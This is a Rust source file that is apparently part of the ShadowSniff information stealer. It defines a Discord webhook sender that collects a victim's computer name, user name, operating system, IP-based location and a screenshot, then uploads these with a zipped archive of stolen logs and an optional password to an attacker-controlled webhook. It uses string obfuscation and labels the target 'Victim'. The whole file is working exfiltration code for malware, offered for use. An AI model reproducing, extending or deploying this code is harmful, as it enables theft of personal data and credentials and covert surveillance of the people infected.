use crate::{ExternalLink, LogContent, LogFile, LogSender, SendError};
use alloc::string::{String, ToString};
use alloc::sync::Arc;
use alloc::vec::Vec;
use alloc::{format, vec};
use collector::display::{CollectorBlock, CollectorDisplay};
use collector::{Collector, Device};
use core::fmt::Write;
use core::fmt::{Display, Formatter};
use derive_new::new;
use indoc::{formatdoc, writedoc};
use ipinfo::{IpInfo, unwrapped_ip_info};
use obfstr::obfstr as s;
use requests::{
    BodyRequestBuilder, MultipartBuilder, Request, RequestBuilder, write_file_field,
    write_text_field,
};
use utils::pc_info::PcInfo;
use utils::{format_size, internal_code_to_flag};

/// A log sender that transmits data to a Discord channel using a webhook.
///
/// `DiscordWebhookSender` uses Discord's webhook API to send embedded messages
/// and files such as screenshots or zipped logs. It supports formatting logs
/// with rich embeds and fallbacks for size constraints.
///
/// # Fields
///
/// - `webhook`: The full Discord webhook URL, including the webhook ID and token.
///
/// # Notes
///
/// - Discord has a file upload limit of 8 MB per file.
#[derive(Clone, new)]
pub struct DiscordWebhookSender {
    #[new(into)]
    webhook: Arc<str>,
}

struct DiscordEmbedFieldBlockDisplay<'a>(&'a CollectorBlock<'a>);

impl Display for DiscordEmbedFieldBlockDisplay<'_> {
    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
        let mut body = String::new();

        for field in self.0.fields.iter() {
            writeln!(
                body,
                "> {} {}: **{}**",
                field.emoji, field.name, field.value
            )?;
        }

        body = body.trim_end_matches(['\r', '\n']).to_string();

        writedoc!(
            f,
            r#"
            {{
                "name": "{emoji} {name}",
                "value": "{body}",
                "inline": true
            }}
            "#,
            emoji = self.0.emoji,
            name = self.0.name,
            body = body.replace("\n", "\\n")
        )
    }
}

fn generate_embed<P, C>(log: &LogContent, password: Option<P>, collector: &C) -> String
where
    P: AsRef<str>,
    C: Collector,
{
    let PcInfo {
        computer_name,
        user_name,
        product_name,
    } = PcInfo::retrieve();
    let IpInfo { country, city, .. } = unwrapped_ip_info();
    let country_flag = internal_code_to_flag(&country)
        .map(Arc::from)
        .unwrap_or(country.clone());

    let link = match log {
        LogContent::ExternalLink(ExternalLink {
            service_name,
            link,
            size,
        }) => Some(format!(
            r#"[Download]({link}) from {service_name} **{size}**"#,
            size = format_size(*size as _)
        )),
        _ => None,
    };

    let password = password.map(|password| {
        let password = password.as_ref();
        format!(r#"Password: ||{password}||"#)
    });

    let mut parts = vec![
        format!("✨ New log from {country_flag} **{city}**"),
        format!("Victim: **{computer_name}**/**{user_name}** on **{product_name}**"),
        "".to_string(),
    ];
    if let Some(l) = link {
        parts.push(l);
    }
    if let Some(p) = password {
        parts.push(p);
    }
    let description = if parts.is_empty() {
        "".to_string()
    } else {
        parts.join("\n")
    };

    let fields = collector
        .display_blocks()
        .iter()
        .map(DiscordEmbedFieldBlockDisplay)
        .map(|x| x.to_string())
        .collect::<Vec<_>>()
        .join(", ");

    formatdoc! {
        r#"
        {{
          "description": "{description}",
          "color": 14627378,
          "fields": [
            {fields}
          ],
          "author": {{
            "name": "ShadowSniff",
            "url": "https://github.com/sqlerrorthing/ShadowSniff"
          }},
          "footer": {{
            "text": "by ShadowSniff, made with ❤️"
          }}
        }}"#,
        description = description.replace("\n", "\\n"),
    }
}

impl DiscordWebhookSender {
    fn send_multipart(&self, builder: MultipartBuilder) -> Result<(), SendError> {
        let content_type = builder.content_type();
        let body = builder.finish();

        Request::post(self.webhook.to_string())
            .header(s!("Content-Type"), &content_type)
            .body(body)
            .build()
            .send()
            .ok()
            .ok_or(SendError::Network)?;

        Ok(())
    }
}

impl LogSender for DiscordWebhookSender {
    fn send<P, C>(
        &self,
        log_file: LogFile,
        password: Option<P>,
        collector: &C,
    ) -> Result<(), SendError>
    where
        P: AsRef<str> + Clone,
        C: Collector,
    {
        if let LogContent::ZipArchive(archive) = &log_file.content
            && archive.len() >= 8 * 1024 * 1024
        // 8 MB
        {
            return Err(SendError::LogFileTooBig);
        }

        if let Some(screenshot) = collector.get_device().get_screenshot() {
            let mut builder = MultipartBuilder::new("----Multipart");
            write_file_field!(builder, "file", "screenshot.png", "image/png", &screenshot);
            write_text_field!(builder, "payload_json", r#"{"content": ""}"#);
            self.send_multipart(builder)?;
        }

        let payload = formatdoc! {
            r#"{{
                "content": "",
                "embeds": [
                    {embed}
                ]
            }}"#,
            embed = generate_embed(&log_file.content, password, collector),
        };

        let mut builder = MultipartBuilder::new("----Multipart");
        if let LogContent::ZipArchive(archive) = log_file.content {
            write_file_field!(builder, "file", &log_file.name => "application/zip", &archive);
        }

        write_text_field!(builder, "payload_json" => &payload);
        self.send_multipart(builder)?;

        Ok(())
    }
}
